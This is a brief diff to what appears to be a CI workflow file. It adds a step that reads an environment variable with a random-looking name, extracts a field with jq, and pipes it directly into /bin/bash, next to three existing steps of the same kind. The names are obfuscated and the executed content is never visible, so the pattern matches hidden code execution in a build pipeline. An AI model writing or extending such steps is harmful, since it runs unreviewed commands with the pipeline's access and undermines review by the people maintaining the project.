@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$nedap11926" | jq -r .faey2 | /bin/bash
           printf '%s' "$lln3" | jq -r .llrm130 | /bin/bash
           printf '%s' "$kbk10" | jq -r .j4664 | /bin/bash
+          echo $sz091 | jq -r .lz003 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
